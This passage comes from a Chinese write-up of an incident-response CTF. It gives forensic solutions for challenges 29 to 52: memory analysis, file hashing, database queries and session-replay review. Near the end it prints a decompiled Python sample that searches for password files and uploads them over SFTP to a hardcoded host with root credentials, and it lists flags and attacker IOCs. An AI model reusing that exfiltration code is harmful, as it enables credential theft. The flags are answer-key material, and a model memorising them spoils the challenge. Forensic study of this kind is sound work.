<p>flag:  liuling7541  </p>
</blockquote>
<h2 id="应急响应-29"><a href="#应急响应-29" class="headerlink" title="应急响应-29"></a>应急响应-29</h2><p><strong>题目要求：</strong><br>攻击者传入一个木马文件并做了权限维持，请问木马文件名是什么。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>抄的，不会，搜剪切板有<br>python2 vol.py -f /root/Desktop/raw.raw –profile=Win7SP1x64 clipboard<br>Volatility Foundation Volatility Framework 2.6.1<br>Session    WindowStation Format                         Handle Object             Data</p>
<hr>
<pre><code>     1 WinSta0       CF_UNICODETEXT               0x4c0397 0xfffff900c1c19c30 C:\Windows\PLA\h4ck3d!
     1 WinSta0       CF_TEXT                          0x10 ------------------
     1 WinSta0       0x1b01a5L              0x300000000000 ------------------
     1 WinSta0       CF_TEXT                           0x1 ------------------
     1 ------------- ------------------           0x1b01a5 0xfffff900c1cb2b60
</code></pre>
<blockquote>
<p>flag:h4ck3d!</p>
</blockquote>
<h2 id="应急响应-30"><a href="#应急响应-30" class="headerlink" title="应急响应-30"></a>应急响应-30</h2><p><strong>题目要求：</strong><br>请提交该计算机中记录的重要联系人的家庭住址。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxxx]</p>
<p>抄的，第一次知道</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145239118.png" alt="image-20240422145239118"></p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145259333.png" alt="image-20240422145259333"></p>
<p>那么提取，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422145505782.png" alt="image-20240422145505782"></p>
<p>─# cat /root/Deskt941e0f06”&gt;&lt;c:Street&gt;秋水省雁荡市碧波区千屿山庄1号&lt;/c:Stree</p>
<blockquote>
<p>flag:秋水省雁荡市碧波区千屿山庄1号</p>
</blockquote>
<h2 id="应急响应-31"><a href="#应急响应-31" class="headerlink" title="应急响应-31"></a>应急响应-31</h2><p><strong>题目要求：</strong><br>请提交近源靶机上的恶意文件哈希。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<p>近源靶机为pc2,上面有个恶意文件，打开就是<br>PS C:\Users\Administrator\Desktop\artifact&gt; certutil -hashfile .\artifact.exe md5<br>MD5 的 .\artifact.exe 哈希:<br>a7fcd0b15a080167c4c2f05063802a6e<br>CertUtil: -hashfile 命令成功完成。<br>PS C:\Users\Administrator\Desktop\artifact&gt;</p>
<blockquote>
<p>flag a7fcd0b15a080167c4c2f05063802a6e</p>
</blockquote>
<h2 id="应急响应-32"><a href="#应急响应-32" class="headerlink" title="应急响应-32"></a>应急响应-32</h2><p><strong>题目要求：</strong><br>提交恶意程序的外联地址。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxxx]</p>
<p>这个拖到微步，没有检测到外连</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151054884.png" alt="image-20240422151054884"><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422151302325.png" alt="image-20240422151302325"></p>
<p>vt可以</p>
<blockquote>
<p>flag 101.78.63.44</p>
</blockquote>
<h2 id="应急响应-33"><a href="#应急响应-33" class="headerlink" title="应急响应-33"></a>应急响应-33</h2><p><strong>题目要求：</strong><br>提交攻击者使用内网扫描工具的哈希。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>吐槽一下，这到了pc，然后又回到了服务器，有点蒙圈</p>
<p>root@debian:/usr/bin# md5sum fscan<br>1facdcd05c43ba4d37274dffc90b6d4e  fscan</p>
<blockquote>
<p>1facdcd05c43ba4d37274dffc90b6d4e  </p>
</blockquote>
<h2 id="应急响应-34"><a href="#应急响应-34" class="headerlink" title="应急响应-34"></a>应急响应-34</h2><p><strong>题目要求：</strong><br>请提交攻击者在站点上留下的后门密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(xxxx)]</p>
<p>后门的话，在index.php中，<br>waf中可看到执行了命令</p>
<blockquote>
<p>flag 123</p>
</blockquote>
<h2 id="应急响应-35"><a href="#应急响应-35" class="headerlink" title="应急响应-35"></a>应急响应-35</h2><p><strong>题目要求：</strong><br>请提交攻击者在数据库留下的信息。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>还是直接用navicat连数据库比较好，命令行能翻一年<br>MySQL [ultrax]&gt; select * from pre_ucenter_vars;<br>+—————–+——-+<br>| name            | value |<br>+—————–+——-+<br>| flag{hack_palu} | 0     |<br>| noteexists      | 0     |<br>| noteexists1     | 0     |<br>+—————–+——-+<br>3 rows in set (0.001 sec)</p>
<p>MySQL [ultrax]&gt; </p>
<blockquote>
<p>flag{hack_palu} </p>
</blockquote>
<h2 id="应急响应-36"><a href="#应急响应-36" class="headerlink" title="应急响应-36"></a>应急响应-36</h2><p><strong>题目要求：</strong><br>提交攻击者在监控服务器上留下的dcnlog地址。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx.xx.xx]</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422160601984.png" alt="image-20240422160601984"></p>
<p>进入到zabbix的数据库，也就是数据库2，可以查到passwd查一下为原密码</p>
<p>Admin/zabbix<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422161004820.png" alt="image-20240422161004820"></p>
<p>在脚本中有地址</p>
<blockquote>
<p>palu.dcnlog.cn</p>
</blockquote>
<h2 id="应急响应-37"><a href="#应急响应-37" class="headerlink" title="应急响应-37"></a>应急响应-37</h2><p><strong>题目要求：</strong><br>提交监控服务器上恶意用户的上一次登录时间。</p>
<hr>
<p><strong>提交格式：</strong><br>[xx/xx/xx/xx:xx:xx]</p>
<p>用户中有这个登录记录</p>
<p>不 (2024-04-17 01:32:44)</p>
<blockquote>
<p>2024-04-17 01:32:44</p>
</blockquote>
<h2 id="应急响应-38"><a href="#应急响应-38" class="headerlink" title="应急响应-38"></a>应急响应-38</h2><p><strong>题目要求：</strong><br>提交监控服务器上遗留的反弹shell地址和端口。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx:xx]</p>
<p>解一下base64即可</p>
<blockquote>
<p>154.183.110.12:7890</p>
</blockquote>
<h2 id="应急响应-39"><a href="#应急响应-39" class="headerlink" title="应急响应-39"></a>应急响应-39</h2><p><strong>题目要求：</strong><br>提交恶意钓鱼文件的哈希。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>pc2上有一个docx文件，应该是用了调用的</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162222877.png" alt="image-20240422162222877"></p>
<h2 id="应急响应-40"><a href="#应急响应-40" class="headerlink" title="应急响应-40"></a>应急响应-40</h2><p><strong>题目要求：</strong><br>提交恶意文件外连IP。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<h2 id="应急响应-41"><a href="#应急响应-41" class="headerlink" title="应急响应-41"></a>应急响应-41</h2><p><strong>题目要求：</strong><br>提交被恶意文件钓鱼使用者的姓名。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422162758559.png" alt="image-20240422162758559"></p>
<h2 id="应急响应-42"><a href="#应急响应-42" class="headerlink" title="应急响应-42"></a>应急响应-42</h2><p><strong>题目要求：</strong><br>提交攻击者留下的信息。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>z这里，我们找到jumpserver的录像，我第一次知道这东西还有录像功能<br>首先到jump的目录找到config.txt</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172534548.png" alt="image-20240422172534548"></p>
<p>看到录像的位置</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172559581.png" alt="image-20240422172559581"></p>
<p>然后上这里照录象</p>
<p>/data/jumpserver/core/data/media/replay</p>
<p>录像很多，要筛选一下，我们猜测大概在4.16-17进行的渗透<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172751520.png" alt="image-20240422172751520"></p>
<p>在4.17有很多录像，这里注意cast的是linux录像</p>
<p>replay是win录像<br>找到这个打的，9.3m的导出来<br><code>https://player.glyptodon.com/</code></p>
<p>在这个网站打开，文件，看到5：11左右，可以看到写了个注册表</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422172131659.png" alt="image-20240422172131659"></p>
<blockquote>
<p>flag:flag{2024-04-17-hi}</p>
</blockquote>
<h2 id="应急响应-43"><a href="#应急响应-43" class="headerlink" title="应急响应-43"></a>应急响应-43</h2><p><strong>题目要求：</strong><br>提交恶意用户数量。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(xxxx)]</p>
<p>理论上来说，那些用户名都不算，是用户名<br>而admin这些是用户，不理解<br>那一共是49个</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173631566.png" alt="image-20240422173631566"></p>
<blockquote>
<p>flag:49</p>
</blockquote>
<h2 id="应急响应-44"><a href="#应急响应-44" class="headerlink" title="应急响应-44"></a>应急响应-44</h2><p><strong>题目要求：</strong><br>请提交员工集体使用的密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>在15：02的时候，可以看到设置了密码</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422173847516.png" alt="image-20240422173847516"></p>
<blockquote>
<p>Network@2020</p>
</blockquote>
<h2 id="应急响应-45"><a href="#应急响应-45" class="headerlink" title="应急响应-45"></a>应急响应-45</h2><p><strong>题目要求：</strong><br>提交加密文件的哈希。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p>加密文件就是encode。txt<br>hash一下</p>
<p>PS C:\Users\Administrator\Documents&gt; certutil -hashfile .\encode.txt md5<br>MD5 的 .\encode.txt 哈希:<br>dc040203e9122e89ee44ddc85058795a<br>CertUtil: -hashfile 命令成功完成。<br>PS C:\Users\Administrator\Documents&gt;</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174044841.png" alt="image-20240422174044841"></p>
<blockquote>
<p>dc040203e9122e89ee44ddc85058795a</p>
</blockquote>
<h2 id="应急响应-46"><a href="#应急响应-46" class="headerlink" title="应急响应-46"></a>应急响应-46</h2><p><strong>题目要求：</strong><br>提交被攻击者加密的内容明文。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<p><a href="https://www.ddosi.org/drt-aav/">https://www.ddosi.org/drt-aav/</a></p>
<p>这个网站给了码表，对一下就行</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422174049892.png" alt="image-20240422174049892"></p>
<blockquote>
<p>flag:2024ispassword</p>
</blockquote>
<h2 id="应急响应-47"><a href="#应急响应-47" class="headerlink" title="应急响应-47"></a>应急响应-47</h2><p><strong>题目要求：</strong><br>请提交符合基线标准的服务器数量。</p>
<hr>
<p><strong>提交格式：</strong><br>[md5(xx)]</p>
<p>不懂，我看zabbix上就一台机器<br>webserver</p>
<blockquote>
<p>0</p>
</blockquote>
<h2 id="应急响应-48"><a href="#应急响应-48" class="headerlink" title="应急响应-48"></a>应急响应-48</h2><p><strong>题目要求：</strong><br>提交办公区的恶意文件哈希。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<p>在jump上面可以看到4、17上传了一个文件，但是桌面上我们并没有看到，可能就是恶意文件了</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084615143.png" alt="image-20240423084615143"></p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084729345.png" alt="image-20240423084729345"></p>
<p>搜一下，看起来是个python的文件</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423084858362.png" alt="image-20240423084858362"></p>
<blockquote>
<p>5232a191eb2913337e0a93b0a990f2a2</p>
</blockquote>
<h2 id="应急响应-49"><a href="#应急响应-49" class="headerlink" title="应急响应-49"></a>应急响应-49</h2><p><strong>题目要求：</strong><br>提交恶意回连端口。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<p>简单py逆向了</p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085055511.png" alt="image-20240423085055511"></p>
<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085236855.png" alt="image-20240423085236855"></p>
<p>讲pyc到网站解一下就行</p>
<pre><code class="python">#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.8

import os
import paramiko
from getpass import getpass

def search_in_files(directory, search_text):
    pass
# WARNING: Decompyle incomplete


def ssh(local_file_path, remote_file_path):
    hostname = &#39;192.168.20.123&#39;
    port = 22
    username = &#39;root&#39;
    password = &#39;Network@2020&#39;
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname, port, username, password)
    sftp = client.open_sftp()
    sftp.put(local_file_path, remote_file_path)
    sftp.close()
    client.close()
    print(f&#39;&#39;&#39;File {local_file_path} uploaded to {remote_file_path} on {hostname}&#39;&#39;&#39;)
    flag = &#39;flag{234567uyhgn_aiduyai}&#39;

search_directory = &#39;/&#39;
search_for_text = &#39;passwod&#39;
(a, b) = search_in_files(search_directory, search_for_text)
ssh(a, b)
</code></pre>
<blockquote>
<p>22</p>
</blockquote>
<h2 id="应急响应-50"><a href="#应急响应-50" class="headerlink" title="应急响应-50"></a>应急响应-50</h2><p><strong>题目要求：</strong><br>提交恶意程序中的flag。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxx]</p>
<blockquote>
<p> flag{234567uyhgn_aiduyai}</p>
</blockquote>
<h2 id="应急响应-51"><a href="#应急响应-51" class="headerlink" title="应急响应-51"></a>应急响应-51</h2><p><strong>题目要求：</strong><br>提交恶意文件中的search_for_text内容。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
<blockquote>
<p>passwod</p>
</blockquote>
<h2 id="应急响应-52"><a href="#应急响应-52" class="headerlink" title="应急响应-52"></a>应急响应-52</h2><p><strong>题目要求：</strong><br>提交web服务器上攻击者修改后的root密码。</p>
<hr>
<p><strong>提交格式：</strong><br>[xxxx]</p>
